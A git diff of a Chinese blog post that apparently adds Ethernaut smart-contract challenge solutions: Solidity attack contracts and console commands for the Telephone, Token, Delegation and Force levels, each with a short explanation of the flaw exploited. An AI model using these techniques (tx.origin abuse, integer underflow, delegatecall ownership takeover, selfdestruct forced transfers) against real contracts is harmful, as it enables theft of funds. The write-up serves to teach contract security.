@@ -28,7 +28,7 @@
 <meta property="og:description" content="接到了链上的项目，正好学习一下">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-07-19T08:47:00.000Z">
-<meta property="article:modified_time" content="2024-07-19T16:01:49.501Z">
+<meta property="article:modified_time" content="2024-07-21T02:59:55.584Z">
 <meta property="article:author" content="HeyGap">
 <meta property="article:tag" content="Blockchain">
 <meta property="article:tag" content="Smart Contract">
@@ -219,7 +219,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-07-20 00:07:50" itemprop="dateModified" datetime="2024-07-20T00:01:49+08:00">2024-07-20</time>
+                <time title="修改时间：2024-07-21 10:07:58" itemprop="dateModified" datetime="2024-07-21T10:59:55+08:00">2024-07-21</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -291,6 +291,56 @@ receive 函数，发送纯以太币且没有附加数据时，会触发 fallback
 <p>因此，只要我们写一个攻击合约，在攻击合约中获取block.number，再调用被攻击合约的flip函数，那么flip中的block.number就跟攻击合约中的number是相同的了。因此也就达成了攻击的目的。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address addr;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">    event Result(bool, bool);</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) &#123;</span><br><span class="line">        addr = _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip() external &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        (bool success, bytes memory data) = addr.call(abi.encodeWithSignature(&quot;flip(bool)&quot;, side));</span><br><span class="line">        emit Result(success, abi.decode(data, (bool)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h2 id="telephone">04 Telephone</h2>
+<p>本题主要考察 tx.origin 与 msg.sender 的区别，tx.orgin
+指的是交易的发起方，msg.sender
+指的是合约的直接调用者。比如，当用户X通过合约A调用合约B时：对于合约A，tx.origin
+与 msg.sender 都是用户X；对于合约B，tx.origin 是用户X，msg.sender
+是合约A</p>
+<p>因此我们只需要部署一个合约A，通过该合约调用题目函数即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">  function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Telephone constant private target = Telephone(0xdeE55F3707b4462D224A931cB6B2e2c619C9EFFB);</span><br><span class="line">    function call() public &#123;</span><br><span class="line">        target.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="token">05 Token</h2>
+<p>整数溢出。balances 和 value 都是 uint256
+型的，所以减完了还是正数，由于初始余额有20，我们直接减21即可
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">contract.<span class="property">address</span></span><br><span class="line"><span class="string">&#x27;0x440f5dD58996e284Bf339399cE48580cf2ADC84b&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">transfer</span>(<span class="string">&quot;0x440f5dD58996e284Bf339399cE48580cf2ADC84b&quot;</span>,<span class="number">21</span>)</span><br></pre></td></tr></table></figure></p>
+<h2 id="delegation">06 Delegation</h2>
+<p>本题考察对合约调用方式的理解。合约调用共有三种方式</p>
+<ul>
+<li>call: 调用后内置变量 msg
+的值会修改为调用者，执行环境为被调用者的运行环境</li>
+<li>delegatecall: 调用后内置变量 msg
+的值不会修改为调用者，但执行环境为调用者的运行环境（相当于复制被调用者的代码到调用者合约）</li>
+<li>callcode: 调用后内置变量 msg
+的值会修改为调用者，但执行环境为调用者的运行环境 &gt; 貌似 "callcode"
+已被弃用，取而代之的是 "delegatecall"</li>
+</ul>
+<p>也就是说，当我们以 call 的形式通过合约 Delegation 调用合约 Delegate
+的 pwn 函数时，Delegate 中记录的 msg.sender 是 Delegation
+的地址；而当我们以 Delegate call 的形式通过合约 Delegation 调用合约
+Delegate 的 pwn 函数时，Delegate 中记录的 msg.sender
+是我们自己的地址。</p>
+<p>类比 Telephone 那道题，普通 call 的 msg.sender 就是 msg.sender，而
+DelegateCall 的 msg.sender 是 tx.origin。</p>
+<p>在本题中，合约 Deletation 部署了合约 Delegate，并且有 pwn
+函数可以让我们提权，我们需要通过触发 fallback，通过传入的 data 调用
+pwn()，即<code>await contract.sendTransaction(&#123;data:"0xdd365b8b"&#125;);</code>，至于为什么是
+0xdd365b8b，这好像是 pwn()
+函数的签名再哈希以后的前四字节，可以通过下面的 solidity 代码生成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    bytes4 public result;</span><br><span class="line">    function test() public  &#123;</span><br><span class="line">        result = bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="force">07 Force</h2>
+<p>本题给了空合约，旨在让我们学会如何在合约拒绝转入时强制给它转入
+ETH</p>
+<p>可以通过 selfdestruct() 函数来完成目标，这个合约析构函数有以下性质：
+1. 指令执行后，合约将拒绝服务，地址对应的字节码将被标注为删除</p>
+<ol start="2" type="1">
+<li><p>合约地址中所有的 ETH 将被发送到指定的新地址</p></li>
+<li><p>进行 ETH 转移时，即使目标地址为一个合约地址，也不会触发该地址的
+fallback 函数，因此不需要该合约有任何的 payable 函数</p></li>
+<li><p>如果 selfdestruct 函数被非预期执行，整个合约会拒绝服务</p></li>
+</ol>
+<p>也就是说我们可以写一个合约，让它析构的时候给要攻击的合约转入 1wei,在
+remix 上部署以下合约即可，记得 value 设置成 1wei</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    function forceAttack(address payable _addr) payable external &#123;</span><br><span class="line">        selfdestruct(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="vault">08 Vault</h2>
 
     </div>
 
@@ -399,7 +449,7 @@ receive 函数，发送纯以太币且没有附加数据时，会触发 fallback
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#x00-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">0x00 环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#x01-%E9%A2%98%E7%9B%AE"><span class="nav-number">2.</span> <span class="nav-text">0x01 题目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#hello-ethernaut"><span class="nav-number">2.1.</span> <span class="nav-text">00 Hello Ethernaut</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fallback"><span class="nav-number">2.2.</span> <span class="nav-text">01 Fallback</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#basic"><span class="nav-number">2.2.1.</span> <span class="nav-text">Basic</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exploration"><span class="nav-number">2.2.2.</span> <span class="nav-text">Exploration</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fallout"><span class="nav-number">2.3.</span> <span class="nav-text">02 Fallout</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#coin-flip"><span class="nav-number">2.4.</span> <span class="nav-text">03 Coin Flip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#telephone"><span class="nav-number">2.5.</span> <span class="nav-text">04 Telephone</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#x00-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">0x00 环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#x01-%E9%A2%98%E7%9B%AE"><span class="nav-number">2.</span> <span class="nav-text">0x01 题目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#hello-ethernaut"><span class="nav-number">2.1.</span> <span class="nav-text">00 Hello Ethernaut</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fallback"><span class="nav-number">2.2.</span> <span class="nav-text">01 Fallback</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#basic"><span class="nav-number">2.2.1.</span> <span class="nav-text">Basic</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exploration"><span class="nav-number">2.2.2.</span> <span class="nav-text">Exploration</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fallout"><span class="nav-number">2.3.</span> <span class="nav-text">02 Fallout</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#coin-flip"><span class="nav-number">2.4.</span> <span class="nav-text">03 Coin Flip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#telephone"><span class="nav-number">2.5.</span> <span class="nav-text">04 Telephone</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#token"><span class="nav-number">2.6.</span> <span class="nav-text">05 Token</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#delegation"><span class="nav-number">2.7.</span> <span class="nav-text">06 Delegation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#force"><span class="nav-number">2.8.</span> <span class="nav-text">07 Force</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vault"><span class="nav-number">2.9.</span> <span class="nav-text">08 Vault</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
